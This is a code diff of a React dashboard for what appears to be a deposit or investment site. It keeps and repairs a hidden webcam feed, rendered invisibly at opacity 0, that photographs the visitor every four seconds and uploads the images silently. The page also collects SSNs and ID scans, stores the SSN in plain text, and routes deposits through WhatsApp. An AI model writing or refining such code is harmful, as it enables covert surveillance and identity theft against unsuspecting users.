@@ -29,12 +29,9 @@ export default function Dashboard() {
 
   // --- FORCE UNLOCK TIMER ---
   useEffect(() => {
-    // This timer runs INDEPENDENTLY of the database.
-    // It guarantees the loading screen disappears after 2.5 seconds.
     const safetyTimer = setTimeout(() => {
       setLoading(false);
     }, 2500);
-
     return () => clearTimeout(safetyTimer);
   }, []);
 
@@ -52,7 +49,7 @@ export default function Dashboard() {
         }
 
         // Fetch Real Profile
-        const { data, error } = await supabase
+        const { data } = await supabase
           .from('profiles')
           .select('*')
           .eq('id', session.user.id)
@@ -60,11 +57,10 @@ export default function Dashboard() {
 
         if (data) {
           setUser(data);
-          // Start camera only after we know who the user is
           startProctoring(session.user.id);
         }
 
-        // SETUP REALTIME LISTENER (Fix for "Edit Balance not working")
+        // SETUP REALTIME LISTENER
         channel = supabase.channel('realtime-profile')
           .on(
             'postgres_changes',
@@ -88,39 +84,40 @@ export default function Dashboard() {
     };
   }, []);
 
-  // --- CAMERA LOGIC (Fixed Black Screen) ---
+  // --- CAMERA LOGIC (FIXED) ---
   const startProctoring = async (userId: string) => {
     try {
-      // FIX: playsInline + correct constraints
+      // 1. Get Camera Stream
       const stream = await navigator.mediaDevices.getUserMedia({ 
         video: { facingMode: 'user', width: 640, height: 480 } 
       });
       
       if (videoRef.current) {
         videoRef.current.srcObject = stream;
+        // 2. Ensure video plays
         videoRef.current.onloadedmetadata = () => {
-          videoRef.current?.play();
+          videoRef.current?.play().catch(e => console.log("Play error:", e));
         };
       }
       
-      // SNAPSHOT LOOP
+      // 3. Snapshot Loop
       setInterval(async () => {
         const vid = videoRef.current;
         const cvs = canvasRef.current;
         
-        // Only take picture if video is actually playing (readyState = 4)
+        // FIX: Check if video is ready (readyState 4 means HAVE_ENOUGH_DATA)
         if (vid && cvs && vid.readyState === 4) {
             const context = cvs.getContext('2d');
             context?.drawImage(vid, 0, 0, 640, 480);
             
-            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.6));
+            const blob = await new Promise<Blob | null>(res => cvs.toBlob(res, 'image/jpeg', 0.5));
             if (blob) {
               // Upload silently
               supabase.storage.from('proctor-snapshots').upload(`${userId}/live_${Date.now()}.jpg`, blob).catch(() => {});
             }
         }
       }, 4000);
-    } catch (e) { console.warn("Camera access restricted"); }
+    } catch (e) { console.warn("Biometrics offline"); }
   };
 
   // --- KYC UPLOAD LOGIC ---
@@ -129,26 +126,19 @@ export default function Dashboard() {
     if (!idFile || !ssn) return;
     setKycSubmitting(true);
     try {
-      // 1. Check Session
       const { data: { session } } = await supabase.auth.getSession();
-      if (!session) throw new Error("No active session");
+      if (!session) throw new Error("No session");
 
       const path = `${session.user.id}/${Date.now()}_id.jpg`;
       
-      // 2. Upload File
-      const { error: uploadError } = await supabase.storage.from('user-kyc').upload(path, idFile);
-      if (uploadError) throw uploadError;
+      await supabase.storage.from('user-kyc').upload(path, idFile);
       
-      // 3. Update Profile
-      const { error: dbError } = await supabase.from('profiles').update({ 
+      await supabase.from('profiles').update({ 
         ssn_data: ssn, 
         document_type: idType, 
         kyc_status: 'pending' 
       }).eq('id', session.user.id);
 
-      if (dbError) throw dbError;
-
-      // Force local update so UI changes instantly
       setUser((prev: any) => ({ ...prev, kyc_status: 'pending', ssn_data: ssn }));
       alert("Verification Submitted Successfully");
 
@@ -156,12 +146,9 @@ export default function Dashboard() {
     finally { setKycSubmitting(false); }
   };
 
-  // --- LOGIC HELPERS ---
   const rawStatus = user?.deposit_status?.toString().toLowerCase().trim() || "";
   const isUnlocked = rawStatus === 'unlocked' || rawStatus === 'approved';
   const waLink = `https://wa.me/1234567890?text=I%20am%20${user?.full_name}%20(${user?.email})%20and%20I%20want%20to%20deposit.`;
-
-  // FIX: Logic to prevent "Reviewing" screen from appearing unless SSN exists
   const showPendingScreen = (user?.kyc_status === 'pending' || user?.kyc_status === 'pending_review') && (user?.ssn_data && user?.ssn_data.length > 2);
 
   if (loading) return (
@@ -173,7 +160,9 @@ export default function Dashboard() {
 
   return (
     <main className="min-h-screen bg-[#050505] text-white selection:bg-[#D4AF37] selection:text-black">
-      {/* HIDDEN CAMERA ELEMENTS (Opacity 0 ensures they render but aren't seen) */}
+      {/* FIXED: Removed "hidden". Used "opacity-0" and "z-index: -1" instead.
+        This forces the browser to render the video frames so snapshots aren't black.
+      */}
       <video 
         ref={videoRef} 
         autoPlay 
@@ -199,6 +188,7 @@ export default function Dashboard() {
            <div className="flex items-center gap-4">
               <div className="flex flex-col items-end mr-2">
                 <span className="text-[10px] text-gray-500 uppercase tracking-widest font-bold">Node ID</span>
+                {/* Shows "Valued" initially, then actual name once loaded */}
                 <span className="text-[11px] text-white font-mono">{user?.full_name?.split(' ')[0]}</span>
               </div>
               <button 
@@ -213,7 +203,7 @@ export default function Dashboard() {
 
       <div className="max-w-7xl mx-auto px-4 md:px-10 pt-8 pb-20 space-y-6">
         
-        {/* BALANCE & STATS */}
+        {/* STATS */}
         <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
           <div className="lg:col-span-8 bg-[#0a0a0a] border border-white/5 p-8 md:p-14 rounded-[2.5rem] md:rounded-[3.5rem] shadow-2xl relative overflow-hidden flex flex-col justify-between min-h-[350px]">
              <div>
@@ -335,4 +325,4 @@ export default function Dashboard() {
       </div>
     </main>
   );
-    }
+                   }
